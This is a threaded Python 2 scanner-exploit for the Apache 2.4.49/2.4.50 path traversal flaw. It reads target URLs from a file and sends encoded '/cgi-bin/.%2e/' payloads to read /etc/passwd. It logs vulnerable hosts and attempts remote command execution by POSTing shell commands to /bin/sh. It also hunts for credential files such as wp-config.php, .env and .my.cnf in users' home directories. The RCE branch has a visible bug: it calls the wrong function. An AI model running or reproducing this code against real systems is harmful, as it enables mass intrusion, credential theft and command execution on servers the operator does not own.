#!/usr/bin/python2.7
# -*- coding: utf-8 -*-

import human_curl as requests
import sys
from threading import *
from threading import Thread
from Queue import Queue

# Headers
headers = {'User-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36'}
timeout = 3

# payload
apache_1 = '/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/'
apache_2 = '/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/'
used_payload = apache_2

class Worker(Thread):
	def __init__(self, tasks):
		Thread.__init__(self)
		self.tasks = tasks
		self.daemon = True
		self.start()

	def run(self):
		while True:
			func, args, kargs = self.tasks.get()
			try: func(*args, **kargs)
			except Exception, e: print e
			self.tasks.task_done()

class ThreadPool:
	def __init__(self, num_threads):
		self.tasks = Queue(num_threads)
		for _ in range(num_threads): Worker(self.tasks)

	def add_task(self, func, *args, **kargs):
		self.tasks.put((func, args, kargs))

	def wait_completion(self):
		self.tasks.join()

def config_disclosure(url, passwd):
	try:
		get_user = passwd.split('\n')
		for userline in get_user:
			user = userline.split(':')[1]
			config_path = ['public_html/wp-config.php','public_html/configuration.php','public_html/.env','.accesshash','.my.cnf']
			for cfg_path in config_path:
				try:
					readfile = requests.get(url + used_payload + '/home/' + user + '/' + cfg_path, headers=headers, timeout=timeout, verify=False)
					if readfile.status_code == 200:
						print(url + ' -> Found \033[032;1m' + cfg_path + '\033[0m')
				except KeyboardInterrupt:
					exit('Bye.')
				except Exception as err:
					print(url + ' -> \033[032;1m' + str(err) + '\033[0m')
	except KeyboardInterrupt:
		exit('Bye.')
	except:
		pass


def apache24(url):
	try:
		get_passwd = requests.get(url + used_payload +'/etc/passwd', headers=headers, timeout=timeout, verify=False)
		if get_passwd.status_code == 200:
			if 'root:' in get_passwd.content:
				print(url + ' \033[32m-> Vulnerable -> READONLY\033[0m')
				open('passwd.txt', 'a').write(url + '\n')
		elif get_passwd.status_code == 500:
			open('testRCE.txt', 'a').write(url + '\n')
			test_rce = apache24(url, 'echo "StarchasmNyx"')
			if "StarchasmNyx" in test_rce:
				print(url + ' \033[32m-> Vulnerable -> RCE\033[0m')
				open('RCE.txt', 'a').write(url + '\n')
		else:
			print(url + ' \033[31m-> Not Vulnerable\033[0m')
			open('invalid.txt', 'a').write(url + '\n')
	except KeyboardInterrupt:
		exit('Bye.')
	except Exception as err:
		print(url + ' \033[31m-> ' + str(err) + '\033[0m')
		open('error.txt', 'a').write(url + '\n')

def apache24_rce(url, command):
	try:
		data = 'Yukinoshita=|echo;' + command
		send_payload = requests.post(url + used_payload + '/bin/sh', headers=headers, data=data, timeout=timeout, verify=False)
		return send_payload.content
	except KeyboardInterrupt:
		exit('Bye.')
	except:
		return False


try:
	yuuki = open(sys.argv[1]).read()
except:
	exit('StarchasmNyx')

pool = ThreadPool(8)
for i in yuuki.splitlines():
	x = i.split('/')
	url = x[0] + '//' + x[2]
	pool.add_task(apache24, url)
pool.wait_completion()
